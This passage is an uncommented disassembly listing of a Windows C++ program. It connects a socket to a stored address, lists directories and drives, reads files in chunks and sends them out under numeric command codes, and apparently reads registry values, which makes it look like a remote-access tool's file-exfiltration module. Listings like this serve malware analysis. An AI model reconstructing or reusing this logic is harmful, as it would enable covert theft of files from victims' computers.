call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
call [ exit@IAT ]
pop edi
pop esi
xor al al
pop ebx
leave
retn
sub_402d04
push ebp
mov ebp esp
sub esp 0x3ec
and [ ebp - 0x3ec ] 0x0
push ebx
push esi
push edi
mov ecx 0xf9
xor eax eax
lea edi [ ebp - 0x3eb ]
mov esi rw-data
[ edi ]
stosw [ edi ]
mov ecx esi
stosb [ edi ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x3ec ]
push 0x3e8
mov ebx r--data
mov edi rw-data
push eax
push ebx
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi 0x80000001
push eax
push esi
call sub_40a5ae
add esp 0x1c
test al al
je r-xdata
xor al al
push 0x2
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
lea eax [ ebp - 0x3ec ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push r--data
push esi
call sub_40a624
add esp 0x20
mov ecx edi
mov [ ebp - 0x1 ] al
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a7eb
mov al [ ebp - 0x1 ]
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_402dbf
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
lea eax [ ebp - 0x288 ]
push edi
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
push r--data
push eax
lea eax [ ebp - 0x25c ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
call [ std::operator!=@IAT ]
pop ecx
mov bl al
pop ecx
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
test bl bl
mov edi 0x250
je r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_410fa4
push ecx
push ecx
mov esi esp
push eax
lea eax [ ebp + 0x8 ]
push rw-data
push eax
lea eax [ ebp - 0x38 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x54
call sub_402062
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
jmp r-xdata
mov esi [ FindNextFileW@IAT ]
lea eax [ ebp - 0x288 ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x288 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub esp 0x10
lea eax [ ebp - 0x28 ]
mov esi esp
push eax
lea eax [ ebp + 0x8 ]
push rw-data
push eax
lea eax [ ebp - 0x18 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x50
call sub_402062
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x288 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x288 ]
push eax
push [ ebp - 0x8 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_402f64
push ebp
mov ebp esp
mov eax 0x10240
call sub_412450
push ebx
push esi
push edi
lea ecx [ ebp - 0x458 ]
call sub_402aa8
push r--data
push rw-data
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi 0xfde8
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x458 ]
call sub_402aab
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::empty@IAT ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
cmp edx [ ebp + 0x14 ]
ja r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
cmp eax esi
jb r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
jb r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x458 ]
call sub_402b93
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x58 ]
push esi
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x458 ]
call sub_402b93
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp edi ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
cdq
cmp edx [ ebp + 0x14 ]
jb r-xdata
push ebx
lea eax [ ebp - 0x10240 ]
push esi
push eax
push [ ebp + 0x8 ]
call recv
mov edi eax
cmp edi ebx
jle r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push r--data
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x18 ]
push [ eax ]
lea eax [ ebp - 0x38 ]
push esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
cmp eax esi
jbe r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
cmp eax esi
jae r-xdata
ja r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
jmp r-xdata
add [ ebp - 0x4 ] edi
lea eax [ ebp - 0x10240 ]
push edi
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x57
call sub_4023d9
add esp 0x18
cmp edi ebx
jle r-xdata
lea eax [ ebp - 0x7 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x6 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jg r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov bl 0x1
sub_403195
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov esi eax
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push esi
call [ GetDriveTypeA@IAT ]
push eax
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x44 ]
push 0x2d
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
call [ lstrlenA@IAT ]
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
sub_403267
push ebp
mov ebp esp
sub esp 0x13c
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
call sub_401fd3
xor ebx ebx
mov [ ebp - 0x8 ] 0xfde8
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0xc ] eax
jne r-xdata
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x44 ] ebx
push ecx
push eax
call [ GetFileSize@IAT ]
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ebx
movsd [ edi ] [ esi ]
call sub_402032
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x40 ]
push eax
push [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
call sub_410f44
push ecx
push ecx
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp - 0x24 ]
xor edx edx
mov ecx 0xfde8
mov [ ebp - 0x2c ] 0x1
div ecx
mov [ ebp - 0x14 ] ebx
mov edi eax
inc edi
cmp [ ebp - 0x24 ] ebx
mov [ ebp - 0x48 ] edi
jbe r-xdata
sub esp 0x10
lea eax [ ebp + 0xc ]
mov esi esp
push eax
lea eax [ ebp + 0x2c ]
push rw-data
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x53
call sub_402062
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x10 ]
call sub_402094
mov bl 0x1
mov esi rw-data
jmp r-xdata
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
cmp ebx [ ebp - 0x18 ]
jb r-xdata
push [ ebp - 0x8 ]
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x20 ] eax
push ebx
push ebx
push [ ebp - 0x14 ]
mov [ ebp - 0x30 ] ebx
push [ ebp - 0xc ]
call [ SetFilePointer@IAT ]
lea eax [ ebp - 0x30 ]
push ebx
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x20 ]
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x40 ]
push eax
push [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x25 ]
lea ecx [ ebp - 0x13c ]
push eax
push [ ebp - 0x30 ]
push [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
mov edx esp
push eax
lea eax [ ebp + 0x2c ]
push esi
push eax
push esi
lea eax [ ebp - 0x11c ]
push edi
push eax
mov [ ebp - 0x4c ] edx
call sub_410e67
pop ecx
pop ecx
push eax
push esi
push [ ebp - 0x2c ]
lea eax [ ebp - 0xfc ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
lea eax [ ebp + 0x1c ]
push esi
push eax
lea eax [ ebp + 0xc ]
push esi
push eax
lea eax [ ebp - 0x40 ]
push esi
push eax
lea eax [ ebp - 0xdc ]
push eax
call sub_410fa4
pop ecx
pop ecx
push eax
lea eax [ ebp - 0xbc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x9c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x7c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x10c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xcc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x6c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xac ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xec ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x8c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x12c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x5c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
mov eax [ ebp - 0x4c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov ecx [ ebp - 0x10 ]
add esp 0xc
push 0x52
call sub_402062
cmp eax 0xffffffff
lea ecx [ ebp - 0x5c ]
sete [ ebp - 0x1 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x12c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xec ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x6c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x9c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xbc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xdc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x11c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x13c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x1 ] bl
jne r-xdata
ja r-xdata
mov ecx [ ebp - 0x10 ]
call sub_402094
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
jmp r-xdata
push [ ebp - 0x20 ]
call sub_412390
mov eax [ ebp - 0x8 ]
pop ecx
sub [ ebp - 0x1c ] eax
sbb [ ebp - 0x18 ] ebx
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc [ ebp - 0x2c ]
cmp eax [ ebp - 0x24 ]
jb r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x34
mov edi [ ebp - 0x48 ]
sub_403693
mov eax sub_4126b8
call _EH_prolog
sub esp 0x354
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
lea eax [ ebp - 0x29c ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
or [ esi ] 0xffffffff
xor edi edi
mov [ ebp - 0x4 ] edi
push 0x6
push 0x1
push edi
call socket
mov [ esi ] eax
push 0x10
push rw-data
push eax
call connect
test eax eax
jne r-xdata
push edi
push edi
call _CxxThrowException
push [ esi ]
sub esp 0x10
mov ebx esp
lea eax [ ebp + 0x38 ]
push eax
mov edi rw-data
push edi
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x2b4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x64
call sub_4023d9
add esp 0x18
mov ebx eax
inc ebx
neg ebx
sbb ebx ebx
inc ebx
mov [ ebp - 0x2a0 ] bl
lea ecx [ ebp - 0x2b4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
je r-xdata
push [ tolower@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
